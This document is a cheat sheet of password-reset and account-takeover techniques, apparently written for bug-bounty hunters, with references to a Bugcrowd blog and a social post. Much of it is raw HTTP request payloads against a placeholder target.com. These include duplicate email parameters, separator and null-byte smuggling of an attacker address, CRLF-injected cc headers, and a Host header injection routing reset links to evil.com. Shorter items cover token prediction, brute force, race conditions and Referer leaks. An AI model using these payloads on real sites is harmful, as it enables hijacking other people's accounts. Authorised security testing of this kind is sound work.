---

### **Password Reset & Account Takeover Techniques**

#### **1. Parameter Pollution**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail.com&email=hacker@mail.com

#### **2. Host Header Injection**
POST /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
...
email=victim@mail.com

#### **3. Using Separators in Parameter Values**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail.com,hacker@mail.com

email=victim@mail.com%00hacker@mail.com

email=victim@mail.com|hacker@mail.com

email=victim@mail.com%20hacker@mail.com

#### **4. No Domain in Parameter Value**
POST /reset HTTP/1.1
Host: target.com
...
email=victim

#### **5. No TLD in Parameter Value**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail

#### **6. Using Carbon Copy (CC)**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail.com%0a%0dcc:hacker@mail.com

#### **7. JSON Data Manipulation**
POST /newaccount HTTP/1.1
Host: target.com
...
{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}

#### **8. Token Generation Analysis**
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user

#### **9. Cross-Site Scripting (XSS) in the Form**
- Try injecting XSS payloads in the password reset form.

#### **10. Race Condition**
- Send victim reset password and attacker reset password requests simultaneously.

#### **11. Password Reset Token Leak Via Referrer**
- Check if the reset token is leaked in the HTTP Referrer header.

#### **12. Guessable UUID**
- Test if the reset token is a guessable UUID.

#### **13. Brute Force Password Reset Token**
- Attempt to brute force the reset token if it is short or predictable.

#### **14. Try Using Your Token**
- Use your own reset token on another account to see if it works.

#### **15. Reset Password with Email 1, Change Email to Another**
- Reset password with email 1, then change email to another. Check if the link from email 1 still works.

#### **16. References**
- Twitter Post: https://x.com/Securrtech/status/1776580537429422217
- Bugcrowd Blog: https://www.bugcrowd.com/blog/breaking-the-chain-exploiting-oauth-and-forgot-password-for-account-takeover/

---

-- https://xmind.ai/share/UYJM9L9t
-- https://xmind.ai/share/UYJM9L9t?xid=yDAky4KX
